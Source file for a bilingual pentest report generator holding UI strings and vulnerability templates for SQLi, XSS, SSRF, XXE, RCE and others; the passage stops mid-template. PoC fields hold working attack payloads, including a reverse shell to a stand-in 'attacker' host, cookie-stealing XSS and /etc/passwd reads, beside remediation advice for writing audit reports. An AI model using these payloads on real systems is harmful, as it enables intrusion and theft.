const state = {
    lang: 'es',
    showSplash: false,
    activeTab: 'editor',
    isLoading: false,
    currentReportId: null,
    savedReports: [],
    showReportSelector: false,
    auditData: {
        documentTitle: 'Reporte Técnico de Vulnerabilidades',
        clientCompany: 'Empresa Cliente S.A.',
        clientLogo: ['', ''],
        targetAsset: 'Aplicación Principal',
        auditorCompany: 'Empresa Auditora LLC',
        auditorName: 'Juan Pérez',
        classification: '2',
        version: '1.0',
        date: new Date().toISOString().split('T')[0],
        lang: 'es',
        auditType: 'pentesting_web',
        hasIncidents: false,
        incidentsText: '',
        auditSummary: '',
        testsPerformed: '',
        recommendedSolutions: ''
    },
    findings: [],
    editingFindingIndex: null,
    currentFinding: {
        templateKey: 'custom',
        title: '',
        severity: 'med',
        description: '',
        cvss: '',
        poc: '',
        impact: '',
        remediation: '',
        reference: '',
        cve: '',
        images: []
    },
    isDirty: false
};

const UI = {
    es: {
        appTitle: 'Pentestify',
        appSubtitle: 'Security Report Generator',
        welcome: 'Bienvenido a',
        tagline: 'Generador de Reportes de Pentesting',
        description: 'Crea reportes profesionales de vulnerabilidades con plantillas predefinidas y exportación PDF.',
        enterApp: 'Entrar a la Aplicación',
        newFinding: 'Registrar Nuevo Hallazgo',
        newFindingDesc: 'Completa los detalles de la vulnerabilidad descubierta.',
        quickTemplate: 'Plantilla Rápida (Auto-completar)',
        customOther: 'Personalizado / Otro',
        vulnTitle: 'Título de la Vulnerabilidad',
        severity: 'Nivel de Severidad',
        description: 'Descripción de la Vulnerabilidad',
        cvss: 'Puntuación CVSS (0-10)',
        poc: 'Pasos para Reproducir (PoC)',
        impact: 'Impacto en el Negocio',
        remediation: 'Solución y Remediación',
        reference: 'Referencias (URLs)',
        cve: 'Identificador CVE',
        images: 'Evidencias (Imágenes)',
        addImages: 'Agregar Imágenes',
        addFinding: 'Agregar Hallazgo',
        updateFinding: 'Actualizar Hallazgo',
        cancel: 'Cancelar',
        preview: 'Vista Previa',
        generatePdf: 'Generar PDF',
        saveReport: 'Guardar Reporte',
        myReports: 'Mis Reportes',
        backToEditor: 'Volver al Editor',
        createNewReport: 'Crear Nuevo Reporte',
        noReports: 'No hay reportes guardados',
        noReportsDesc: 'Crea tu primer reporte usando el botón de arriba',
        editor: 'Edición',
        severityLevels: {
            crit: 'Crítico',
            high: 'Alto',
            med: 'Medio',
            low: 'Bajo',
            info: 'Informativo'
        },
        targetAsset: 'Activo a Auditar',
        clientCompany: 'Empresa Cliente',
        clientLogo1: 'Logotipo 1 (opcional)',
        clientLogo2: 'Logotipo 2 (opcional)',
        auditorCompany: 'Empresa Auditora',
        auditorName: 'Nombre del Auditor',
        documentTitle: 'Título del Documento',
        date: 'Fecha del Reporte',
        classification: 'Clasificación',
        version: 'Versión',
        classifications: {
            '1': 'Público',
            '2': 'Interno',
            '3': 'Confidencial',
            '4': 'Restringido'
        },
        auditType: 'Tipo de Auditoría',
        auditTypes: {
            'pentesting_web': 'Pentesting Web',
            'caja_negra': 'Caja Negra (Black Box)',
            'caja_gris': 'Caja Gris (Grey Box)',
            'caja_blanca': 'Caja Blanca (White Box)',
            'intrusion_interna': 'Intrusión Interna',
            'phishing': 'Campaña de Phishing',
            'analisis_automatico': 'Análisis Automático de Vulnerabilidades'
        },
        incidents: 'Incidencias durante la Auditoría',
        incidentsYes: 'Sí, hubo incidencias',
        incidentsNo: 'No hubo incidencias',
        incidentsDesc: 'Descripción de las incidencias',
        incidentsNoneText: 'No se registraron incidencias durante el proceso de auditoría.',
        incidentsSectionTitle: 'Incidencias',
        auditSummary: 'Resumen de la Auditoría',
        auditSummaryDesc: 'Resumen ejecutivo de los hallazgos, alcance y conclusiones de la auditoría.',
        testsPerformed: 'Pruebas Realizadas',
        testsPerformedDesc: 'Descripción detallada de las pruebas y técnicas utilizadas durante la auditoría.',
        recommendedSolutions: 'Soluciones Recomendadas',
        recommendedSolutionsDesc: 'Plan de remediación con prioridades y recomendaciones generales.'
    },
    en: {
        appTitle: 'Pentestify',
        appSubtitle: 'Security Report Generator',
        welcome: 'Welcome to',
        tagline: 'Pentesting Report Generator',
        description: 'Create professional vulnerability reports with predefined templates and PDF export.',
        enterApp: 'Enter Application',
        newFinding: 'Register New Finding',
        newFindingDesc: 'Complete the details of the discovered vulnerability.',
        quickTemplate: 'Quick Template (Auto-fill)',
        customOther: 'Custom / Other',
        vulnTitle: 'Vulnerability Title',
        severity: 'Severity Level',
        description: 'Vulnerability Description',
        cvss: 'CVSS Score (0-10)',
        poc: 'Steps to Reproduce (PoC)',
        impact: 'Business Impact',
        remediation: 'Solution and Remediation',
        reference: 'References (URLs)',
        cve: 'CVE Identifier',
        images: 'Evidence (Images)',
        addImages: 'Add Images',
        addFinding: 'Add Finding',
        updateFinding: 'Update Finding',
        cancel: 'Cancel',
        preview: 'Preview',
        generatePdf: 'Generate PDF',
        saveReport: 'Save Report',
        myReports: 'My Reports',
        backToEditor: 'Back to Editor',
        createNewReport: 'Create New Report',
        noReports: 'No saved reports',
        noReportsDesc: 'Create your first report using the button above',
        editor: 'Editor',
        severityLevels: {
            crit: 'Critical',
            high: 'High',
            med: 'Medium',
            low: 'Low',
            info: 'Informational'
        },
        targetAsset: 'Target Asset',
        clientCompany: 'Client Company',
        clientLogo1: 'Client Logo 1 (optional)',
        clientLogo2: 'Client Logo 2 (optional)',
        auditorCompany: 'Auditor Company',
        auditorName: 'Auditor Name',
        documentTitle: 'Document Title',
        date: 'Report Date',
        classification: 'Classification',
        version: 'Version',
        classifications: {
            '1': 'Public',
            '2': 'Internal',
            '3': 'Confidential',
            '4': 'Restricted'
        },
        auditType: 'Audit Type',
        auditTypes: {
            'pentesting_web': 'Web Pentesting',
            'caja_negra': 'Black Box',
            'caja_gris': 'Grey Box',
            'caja_blanca': 'White Box',
            'intrusion_interna': 'Internal Intrusion',
            'phishing': 'Phishing Campaign',
            'analisis_automatico': 'Automatic Vulnerability Analysis'
        },
        incidents: 'Incidents during the Audit',
        incidentsYes: 'Yes, there were incidents',
        incidentsNo: 'No incidents',
        incidentsDesc: 'Incident description',
        incidentsNoneText: 'No incidents were recorded during the audit process.',
        incidentsSectionTitle: 'Incidents',
        auditSummary: 'Audit Summary',
        auditSummaryDesc: 'Executive summary of findings, scope and conclusions of the audit.',
        testsPerformed: 'Tests Performed',
        testsPerformedDesc: 'Detailed description of tests and techniques used during the audit.',
        recommendedSolutions: 'Recommended Solutions',
        recommendedSolutionsDesc: 'Remediation plan with priorities and general recommendations.'
    }
};

const templates = {
    sqli: {
        key: 'sqli',
        es: {
            title: 'Inyección SQL (SQL Injection)',
            description: 'Se ha detectado una vulnerabilidad de Inyección SQL que permite a un atacante manipular consultas SQL arbitrarias...',
            poc: '1. Identificar un campo de entrada vulnerable (login, búsqueda, parámetro URL)\n2. Inyectar: \' OR \'1\'=\'1\' --\n3. Observar que la consulta devuelve resultados no autorizados\n4. Usar UNION SELECT para extraer datos: UNION SELECT username,password FROM users--',
            impact: 'Un atacante podría acceder, modificar o eliminar datos sensibles de la base de datos...',
            remediation: 'Implementar consultas preparadas (prepared statements) con parámetros parametrizados...',
            cvss: '8.1',
            reference: 'OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection'
        },
        en: {
            title: 'SQL Injection',
            description: 'A SQL Injection vulnerability has been detected that allows an attacker to manipulate arbitrary SQL queries...',
            poc: '1. Identify a vulnerable input field (login, search, URL parameter)\n2. Inject: \' OR \'1\'=\'1\' --\n3. Observe unauthorized results are returned\n4. Use UNION SELECT to extract data: UNION SELECT username,password FROM users--',
            impact: 'An attacker could access, modify or delete sensitive database data...',
            remediation: 'Implement prepared statements with parameterized queries...',
            cvss: '8.1',
            reference: 'OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection'
        }
    },
    xss: {
        key: 'xss',
        es: {
            title: 'Cross-Site Scripting (XSS)',
            description: 'La aplicación no sanitiza adecuadamente la entrada del usuario permitiendo la inyección de scripts maliciosos...',
            poc: '1. Localizar un campo que refleje input (comentarios, búsqueda, perfil)\n2. Inyectar: <script>alert(\'XSS\')</script>\n3. Si aparece el popup, probar: <img src=x onerror=alert(document.cookie)>\n4. Para XSS almacenado: el payload persiste y ejecuta en otros usuarios',
            impact: 'Permite a un atacante ejecutar scripts en el navegador de la víctima...',
            remediation: 'Implementar sanitización de entrada (input validation) y escaping de output...',
            cvss: '6.1',
            reference: 'OWASP XSS: https://owasp.org/www-community/attacks/xss/'
        },
        en: {
            title: 'Cross-Site Scripting (XSS)',
            description: 'The application does not properly sanitize user input allowing injection of malicious scripts...',
            poc: '1. Locate a field that reflects input (comments, search, profile)\n2. Inject: <script>alert(\'XSS\')</script>\n3. If popup appears, try: <img src=x onerror=alert(document.cookie)>\n4. For stored XSS: payload persists and executes on other users',
            impact: 'Allows an attacker to execute scripts in the victim\'s browser...',
            remediation: 'Implement input validation and output escaping...',
            cvss: '6.1',
            reference: 'OWASP XSS: https://owasp.org/www-community/attacks/xss/'
        }
    },
    idor: {
        key: 'idor',
        es: {
            title: 'IDOR (Insecure Direct Object Reference)',
            description: 'Se ha detectado una vulnerabilidad IDOR que permite a un atacante acceder a recursos o datos de otros usuarios manipulando identificadores en las peticiones.',
            poc: '1. Identificar endpoints con IDs numéricos: /api/users/123/documents\n2. Cambiar el ID: /api/users/124/documents → acceder a datos de otro usuario\n3. Probar con diferentes métodos HTTP: GET, PUT, DELETE\n4. Verificar que no hay validación de propiedad del recurso',
            impact: 'Un atacante podría acceder, modificar o eliminar datos de otros usuarios sin autorización, violando la confidencialidad e integridad de la información.',
            remediation: 'Implementar controles de autorización en cada acceso a recursos, utilizar identificadores indirectos (GUIDs) y validar que el usuario autenticado tenga permisos sobre el recurso solicitado.',
            cvss: '7.5',
            reference: 'OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference'
        },
        en: {
            title: 'IDOR (Insecure Direct Object Reference)',
            description: 'An IDOR vulnerability has been detected that allows an attacker to access other users\' resources or data by manipulating identifiers in requests.',
            poc: '1. Identify endpoints with numeric IDs: /api/users/123/documents\n2. Change the ID: /api/users/124/documents → access another user\'s data\n3. Try different HTTP methods: GET, PUT, DELETE\n4. Verify no resource ownership validation exists',
            impact: 'An attacker could access, modify or delete other users\' data without authorization, violating data confidentiality and integrity.',
            remediation: 'Implement authorization controls on every resource access, use indirect identifiers (GUIDs) and validate that the authenticated user has permissions over the requested resource.',
            cvss: '7.5',
            reference: 'OWASP IDOR: https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference'
        }
    },
    ssrf: {
        key: 'ssrf',
        es: {
            title: 'SSRF (Server-Side Request Forgery)',
            description: 'La aplicación permite que un atacante fuerce al servidor a realizar peticiones a recursos internos o externos controlados por el atacante.',
            poc: '1. Identificar parámetros que aceptan URLs: ?url=, ?target=, ?endpoint=\n2. Probar acceso a metadata cloud: http://169.254.169.254/latest/meta-data/\n3. Escaneo de puertos internos: http://localhost:22, http://127.0.0.1:3306\n4. Exfiltración de archivos: file:///etc/passwd o gopher://',
            impact: 'Un atacante podría acceder a servicios internos, escanear puertos internos, acceder a metadata de cloud, o exfiltrar datos sensibles desde la red interna.',
            remediation: 'Validar y sanitizar todas las URLs de entrada, usar listas blancas de dominios permitidos, deshabilitar esquemas peligrosos (file://, gopher://), y usar DNS resolving con validación.',
            cvss: '8.2',
            reference: 'OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
        },
        en: {
            title: 'SSRF (Server-Side Request Forgery)',
            description: 'The application allows an attacker to force the server to make requests to internal or external resources controlled by the attacker.',
            poc: '1. Identify URL parameters: ?url=, ?target=, ?endpoint=\n2. Test cloud metadata access: http://169.254.169.254/latest/meta-data/\n3. Internal port scanning: http://localhost:22, http://127.0.0.1:3306\n4. File exfiltration: file:///etc/passwd or gopher://',
            impact: 'An attacker could access internal services, scan internal ports, access cloud metadata, or exfiltrate sensitive data from the internal network.',
            remediation: 'Validate and sanitize all input URLs, use whitelists of allowed domains, disable dangerous schemes (file://, gopher://), and use DNS resolving with validation.',
            cvss: '8.2',
            reference: 'OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery'
        }
    },
    csrf: {
        key: 'csrf',
        es: {
            title: 'CSRF (Cross-Site Request Forgery)',
            description: 'La aplicación no implementa protección contra CSRF, permitiendo que un atacante induzca a un usuario autenticado a realizar acciones no deseadas.',
            poc: '1. Identificar formularios sin tokens CSRF (cambio de email, contraseña, transferencias)\n2. Crear página HTML maliciosa con form auto-submit\n3. Enviar víctima autenticada a la página: POST /change-password automático\n4. Verificar que la acción se ejecuta sin validación adicional',
            impact: 'Un atacante podría realizar acciones en nombre del usuario (cambiar contraseña, realizar transferencias, modificar datos) sin su conocimiento o consentimiento.',
            remediation: 'Implementar tokens CSRF únicos en formularios, usar el atributo SameSite en cookies, validar el header Origin/Referer, y reautenticar para acciones sensibles.',
            cvss: '6.8',
            reference: 'OWASP CSRF: https://owasp.org/www-community/attacks/csrf'
        },
        en: {
            title: 'CSRF (Cross-Site Request Forgery)',
            description: 'The application does not implement CSRF protection, allowing an attacker to induce an authenticated user to perform unwanted actions.',
            poc: '1. Identify forms without CSRF tokens (email change, password, transfers)\n2. Create malicious HTML page with auto-submit form\n3. Send authenticated victim to page: POST /change-password automatically\n4. Verify action executes without additional validation',
            impact: 'An attacker could perform actions on behalf of the user (change password, make transfers, modify data) without their knowledge or consent.',
            remediation: 'Implement unique CSRF tokens in forms, use SameSite cookie attribute, validate Origin/Referer headers, and re-authenticate for sensitive actions.',
            cvss: '6.8',
            reference: 'OWASP CSRF: https://owasp.org/www-community/attacks/csrf'
        }
    },
    xxe: {
        key: 'xxe',
        es: {
            title: 'XXE (XML External Entity)',
            description: 'El procesador XML de la aplicación permite entidades externas, permitiendo a un atacante leer archivos locales, realizar SSRF o causar DoS.',
            poc: '1. Identificar endpoints que procesan XML (SOAP, REST XML, import/export)\n2. Inyectar DOCTYPE con entidad externa: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n3. Usar la entidad en el cuerpo: &xxe;\n4. Para SSRF: <!ENTITY xxe SYSTEM "http://internal-service/">',
            impact: 'Un atacante podría leer archivos locales del servidor, acceder a servicios internos, ejecutar SSRF, o causar denegación de servicio (DoS).',
            remediation: 'Deshabilitar entidades externas y DTDs en el procesador XML (XXE=disable), usar formatos alternativos como JSON, y validar el input XML estrictamente.',
            cvss: '7.5',
            reference: 'OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'
        },
        en: {
            title: 'XXE (XML External Entity)',
            description: 'The application\'s XML processor allows external entities, enabling an attacker to read local files, perform SSRF, or cause DoS.',
            poc: '1. Identify XML processing endpoints (SOAP, REST XML, import/export)\n2. Inject DOCTYPE with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n3. Use entity in body: &xxe;\n4. For SSRF: <!ENTITY xxe SYSTEM "http://internal-service/">',
            impact: 'An attacker could read local server files, access internal services, execute SSRF, or cause denial of service (DoS).',
            remediation: 'Disable external entities and DTDs in the XML processor (XXE=disable), use alternative formats like JSON, and strictly validate XML input.',
            cvss: '7.5',
            reference: 'OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'
        }
    },
    rce: {
        key: 'rce',
        es: {
            title: 'RCE (Remote Code Execution)',
            description: 'La aplicación permite la ejecución de código arbitrario en el servidor mediante la inyección de comandos o código en funciones vulnerables.',
            poc: '1. Identificar funciones que ejecutan código: eval(), exec(), system(), passthru()\n2. Inyectar payload en parámetros: ; cat /etc/passwd, | whoami, $(id)\n3. Para webs: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1',
            impact: 'Un atacante podría tomar control completo del servidor, acceder a datos sensibles, moverse lateralmente en la red o instalar malware persistente.',
            remediation: 'Nunca ejecutar input del usuario sin validación, usar listas blancas de entrada, implementar sandboxing, y aplicar el principio de mínimo privilegio.',
            cvss: '9.8',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        },
        en: {
            title: 'RCE (Remote Code Execution)',
            description: 'The application allows arbitrary code execution on the server by injecting commands or code into vulnerable functions.',
            poc: '1. Identify code execution functions: eval(), exec(), system(), passthru()\n2. Inject payload in parameters: ; cat /etc/passwd, | whoami, $(id)\n3. For web: ?page=php://filter/convert.base64-encode/resource=/etc/passwd\n4. Reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1',
            impact: 'An attacker could take complete control of the server, access sensitive data, move laterally in the network, or install persistent malware.',
            remediation: 'Never execute user input without validation, use input whitelists, implement sandboxing, and apply the principle of least privilege.',
            cvss: '9.8',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        }
    },
    lfi: {
        key: 'lfi',
        es: {
            title: 'LFI (Local File Inclusion)',
            description: 'La aplicación permite incluir archivos locales del servidor mediante la manipulación de parámetros, permitiendo leer archivos sensibles.',
            poc: '1. Identificar parámetros de inclusión: ?page=, ?file=, ?include=\n2. Probar con paths relativos: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. Wrapper PHP: php://filter/convert.base64-encode/resource=/etc/passwd',
            impact: 'Un atacante podría leer archivos sensibles del sistema (/etc/passwd, archivos de configuración, código fuente) o potencialmente ejecutar código.',
            remediation: 'Validar y sanitizar rutas de archivo, usar listas blancas de archivos permitidos, evitar usar input del usuario en rutas, y deshabilitar funciones peligrosas.',
            cvss: '7.1',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        },
        en: {
            title: 'LFI (Local File Inclusion)',
            description: 'The application allows including local server files by manipulating parameters, enabling reading of sensitive files.',
            poc: '1. Identify inclusion parameters: ?page=, ?file=, ?include=\n2. Try relative paths: ?page=../../../etc/passwd\n3. Null byte bypass (PHP < 5.3.4): ?page=../../../etc/passwd%00\n4. PHP wrapper: php://filter/convert.base64-encode/resource=/etc/passwd',
            impact: 'An attacker could read sensitive system files (/etc/passwd, configuration files, source code) or potentially execute code.',
            remediation: 'Validate and sanitize file paths, use whitelists of allowed files, avoid using user input in paths, and disable dangerous functions.',
            cvss: '7.1',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        }
    },
    cors: {
        key: 'cors',
        es: {
            title: 'CORS Misconfiguration',
            description: 'La configuración CORS de la aplicación es incorrecta, permitiendo que sitios maliciosos realicen peticiones en nombre de usuarios autenticados.',
            poc: '1. Verificar headers CORS: Access-Control-Allow-Origin: *\n2. Probar con Origin header malicioso: Origin: https://evil.com\n3. Verificar si credenciales están permitidas con wildcard\n4. Crear script en evil.com que haga fetch autenticado a la API',
            impact: 'Un atacante podría realizar peticiones autenticadas desde dominios maliciosos, acceder a datos sensibles o realizar acciones no autorizadas.',
            remediation: 'Validar el header Origin contra una lista blanca, no usar wildcard (*) con credenciales, y implementar headers CORS restrictivos según el recurso.',
            cvss: '6.1',
            reference: 'OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration'
        },
        en: {
            title: 'CORS Misconfiguration',
            description: 'The application\'s CORS configuration is incorrect, allowing malicious sites to make requests on behalf of authenticated users.',
            poc: '1. Check CORS headers: Access-Control-Allow-Origin: *\n2. Test with malicious Origin header: Origin: https://evil.com\n3. Verify credentials allowed with wildcard\n4. Create script on evil.com making authenticated fetch to API',
            impact: 'An attacker could make authenticated requests from malicious domains, access sensitive data, or perform unauthorized actions.',
            remediation: 'Validate Origin header against a whitelist, do not use wildcard (*) with credentials, and implement restrictive CORS headers per resource.',
            cvss: '6.1',
            reference: 'OWASP CORS: https://owasp.org/www-community/attacks/CORS_Misconfiguration'
        }
    },
    path_traversal: {
        key: 'path_traversal',
        es: {
            title: 'Path Traversal / Directory Traversal',
            description: 'La aplicación no valida adecuadamente las rutas de archivo, permitiendo a un atacante acceder a directorios y archivos fuera del directorio permitido.',
            poc: '1. Identificar parámetros de descarga/archivo: ?download=report.pdf\n2. Probar secuencias de traversal: ?download=../../../etc/passwd\n3. Codificaciones alternativas: ..%2f..%2f..%2fetc/passwd\n4. Bypass con doble encoding: %252e%252e%252fetc%252fpasswd',
            impact: 'Un atacante podría acceder a archivos sensibles del sistema operativo, archivos de configuración, logs, o código fuente de la aplicación.',
            remediation: 'Validar y sanitizar rutas eliminando secuencias como ../, usar chroot jails, validar extensiones permitidas, y usar APIs de archivos seguras.',
            cvss: '7.5',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        },
        en: {
            title: 'Path Traversal / Directory Traversal',
            description: 'The application does not properly validate file paths, allowing an attacker to access directories and files outside the allowed directory.',
            poc: '1. Identify download/file parameters: ?download=report.pdf\n2. Try traversal sequences: ?download=../../../etc/passwd\n3. Alternative encodings: ..%2f..%2f..%2fetc/passwd\n4. Double encoding bypass: %252e%252e%252fetc%252fpasswd',
            impact: 'An attacker could access sensitive operating system files, configuration files, logs, or application source code.',
            remediation: 'Validate and sanitize paths removing sequences like ../, use chroot jails, validate allowed extensions, and use safe file APIs.',
            cvss: '7.5',
            reference: 'OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal'
        }
    },
    command_injection: {
        key: 'command_injection',
        es: {
            title: 'Command Injection',
            description: 'La aplicación ejecuta comandos del sistema operativo incluyendo input del usuario sin validación adecuada, permitiendo la ejecución de comandos arbitrarios.',
            poc: '1. Identificar funciones de sistema: ping, nslookup, whois, traceroute\n2. Inyectar comandos adicionales: ; cat /etc/passwd, && whoami, | id\n3. Redirección de output: `comando` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)',
            impact: 'Un atacante podría ejecutar comandos arbitrarios en el servidor, comprometer el sistema completo, o usarlo como pivot para ataques internos.',
            remediation: 'Evitar ejecutar comandos del sistema con input del usuario, usar APIs seguras, implementar listas blancas estrictas, y sanitizar input eliminando metacaracteres.',
            cvss: '9.1',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        },
        en: {
            title: 'Command Injection',
            description: 'The application executes operating system commands including user input without proper validation, allowing arbitrary command execution.',
            poc: '1. Identify system functions: ping, nslookup, whois, traceroute\n2. Inject additional commands: ; cat /etc/passwd, && whoami, | id\n3. Output redirection: `command` > /var/www/output.txt\n4. Blind command injection: ; sleep 5 (time-based detection)',
            impact: 'An attacker could execute arbitrary commands on the server, compromise the entire system, or use it as a pivot for internal attacks.',
            remediation: 'Avoid executing system commands with user input, use secure APIs, implement strict whitelists, and sanitize input removing metacharacters.',
            cvss: '9.1',
            reference: 'OWASP Command Injection: https://owasp.org/www-community/attacks/Command_Injection'
        }
    },
    insecure_deserialization: {
        key: 'insecure_deserialization',
        es: {
            title: 'Insecure Deserialization',
            description: 'La aplicación deserializa datos sin validación adecuada, permitiendo a un atacante manipular objetos serializados para ejecutar código o modificar lógica.',
            poc: '1. Identificar puntos de deserialización: cookies, parámetros, mensajes de cola\n2. Para Java: ysoserial para generar payloads (CommonsCollections, etc.)\n3. Para PHP: manipulación de objetos PHP serializados\n4. Para .NET: gadgets de deserialización con ObjectDataProvider',
            impact: 'Un atacante podría ejecutar código arbitrario, realizar escalada de privilegios, o manipular la lógica de negocio de la aplicación.',
            remediation: 'No deserializar datos de fuentes no confiables, usar formatos seguros como JSON, implementar firmas digitales, y usar deserialización con tipos estrictos.',
            cvss: '8.1',
            reference: 'OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data'
        },
        en: {
            title: 'Insecure Deserialization',
            description: 'The application deserializes data without proper validation, allowing an attacker to manipulate serialized objects to execute code or modify logic.',
            poc: '1. Identify deserialization points: cookies, parameters, queue messages\n2. For Java: ysoserial to generate payloads (CommonsCollections, etc.)\n3. For PHP: manipulate serialized PHP objects\n4. For .NET: deserialization gadgets with ObjectDataProvider',
            impact: 'An attacker could execute arbitrary code, escalate privileges, or manipulate the application\'s business logic.',
            remediation: 'Do not deserialize data from untrusted sources, use safe formats like JSON, implement digital signatures, and use deserialization with strict typing.',
            cvss: '8.1',
            reference: 'OWASP Deserialization: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data'
        }
    },
    jwt_bypass: {
        key: 'jwt_bypass',
        es: {
            title: 'JWT Authentication Bypass',
            description: 'La implementación JWT de la aplicación es vulnerable a bypass mediante algoritmo "none", claves débiles, o falta de validación de firma.',
            poc: '1. Decodificar JWT en jwt.io para ver estructura\n2. Probar algoritmo "none": cambiar alg a "none" y eliminar firma\n3. Cracking de clave débil: jwt_tool o hashcat para HS256\n4. Manipulación de algoritmo RS256→HS256 con clave pública',
            impact: 'Un atacante podría falsificar tokens JWT, impersonar otros usuarios, escalar privilegios, o acceder a funcionalidades protegidas sin autenticación.',
            remediation: 'Validar estrictamente el algoritmo JWT, usar claves seguras (HS256+ o RS256), validar expiración y issuer, y almacenar claves de forma segura.',
            cvss: '8.2',
            reference: 'OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens'
        },
        en: {
            title: 'JWT Authentication Bypass',
            description: 'The application\'s JWT implementation is vulnerable to bypass using "none" algorithm, weak keys, or lack of signature validation.',
            poc: '1. Decode JWT at jwt.io to see structure\n2. Test "none" algorithm: change alg to "none" and remove signature\n3. Crack weak key: jwt_tool or hashcat for HS256\n4. RS256→HS256 manipulation with public key',
            impact: 'An attacker could forge JWT tokens, impersonate other users, escalate privileges, or access protected functionality without authentication.',
            remediation: 'Strictly validate JWT algorithm, use secure keys (HS256+ or RS256), validate expiration and issuer, and store keys securely.',
            cvss: '8.2',
            reference: 'OWASP JWT Security: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_JSON_Web_Tokens'
        }
    },
    file_upload: {
        key: 'file_upload',
        es: {
            title: 'Insecure File Upload',
            description: 'La funcionalidad de subida de archivos no valida adecuadamente tipos de archivo, permitiendo subir archivos ejecutables o peligrosos.',
            poc: '1. Subir archivo con extensión peligrosa: shell.php, malware.exe\n2. Bypass de extensión: shell.php5, shell.phtml, shell.php.jpg\n3. Manipulación MIME type: cambiar Content-Type a image/jpeg\n4. Upload de polyglot: imagen con código PHP/Javascript embebido',
            impact: 'Un atacante podría subir archivos maliciosos (webshells, ejecutables), ejecutar código en el servidor, o realizar ataques contra otros usuarios.',
            remediation: 'Validar extensiones y tipos MIME con listas blancas, escanear archivos con antivirus, renombrar archivos al subir, y almacenar fuera del web root.',
            cvss: '7.5',
            reference: 'OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'
        },
        en: {
            title: 'Insecure File Upload',
            description: 'The file upload functionality does not properly validate file types, allowing upload of executable or dangerous files.',
            poc: '1. Upload file with dangerous extension: shell.php, malware.exe\n2. Extension bypass: shell.php5, shell.phtml, shell.php.jpg\n3. MIME type manipulation: change Content-Type to image/jpeg\n4. Polyglot upload: image with embedded PHP/Javascript code',
            impact: 'An attacker could upload malicious files (webshells, executables), execute code on the server, or perform attacks against other users.',
            remediation: 'Validate extensions and MIME types with whitelists, scan files with antivirus, rename files on upload, and store outside web root.',
            cvss: '7.5',
            reference: 'OWASP File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload'
        }
    },
    security_misconfig: {
        key: 'security_misconfig',
        es: {
            title: 'Security Misconfiguration',
            description: 'La aplicación presenta configuraciones de seguridad incorrectas, credenciales por defecto, headers de seguridad faltantes, o información de debugging expuesta.',
            poc: '1. Verificar headers de seguridad faltantes: X-Frame-Options, CSP, HSTS\n2. Buscar información de debug: stack traces, versión de servidor\n3. Verificar credenciales por defecto: admin/admin, root/toor\n4. Revisar permisos excesivos en directorios y archivos sensibles',
            impact: 'Un atacante podría explotar configuraciones débiles para acceder a datos sensibles, escalar privilegios, o comprometer el sistema.',
            remediation: 'Implementar hardening del servidor, cambiar credenciales por defecto, deshabilitar debugging en producción, y usar headers de seguridad apropiados.',
            cvss: '6.5',
            reference: 'OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
        },
        en: {
            title: 'Security Misconfiguration',
            description: 'The application has incorrect security configurations, default credentials, missing security headers, or exposed debugging information.',
            poc: '1. Check for missing security headers: X-Frame-Options, CSP, HSTS\n2. Search for debug info: stack traces, server version\n3. Verify default credentials: admin/admin, root/toor\n4. Review excessive permissions on directories and sensitive files',
            impact: 'An attacker could exploit weak configurations to access sensitive data, escalate privileges, or compromise the system.',
            remediation: 'Implement server hardening, change default credentials, disable debugging in production, and use appropriate security headers.',
            cvss: '6.5',
            reference: 'OWASP Security Misconfiguration: https://owasp.org/Top10/A05_2021-Security_Misconfiguration/'
        }
    },
    missing_csp: {
        key: 'missing_csp',
        es: {
            title: 'Falta de Cabecera Content-Security-Policy',
            description: 'La aplicación no implementa la cabecera HTTP Content-Security-Policy (CSP), permitiendo la ejecución de scripts maliciosos, inyección de contenido y otros ataques basados en contenido.',
            poc: '1. Verificar cabeceras de respuesta: buscar Content-Security-Policy\n2. Si falta, probar inyección de scripts: <script>alert(\'CSP Missing\')</script>\n3. Verificar carga de recursos externos sin restricciones\n4. Comprobar ejecución de inline scripts y eval()',
            impact: 'Un atacante podría ejecutar ataques XSS, inyectar contenido malicioso, cargar recursos desde dominios no confiables, o realizar clickjacking.',
            remediation: 'Implementar cabecera Content-Security-Policy con directivas restrictivas: default-src \'self\', script-src \'self\', object-src \'none\', frame-ancestors \'none\'. Usar nonces o hashes para scripts inline.',
            cvss: '5.3',
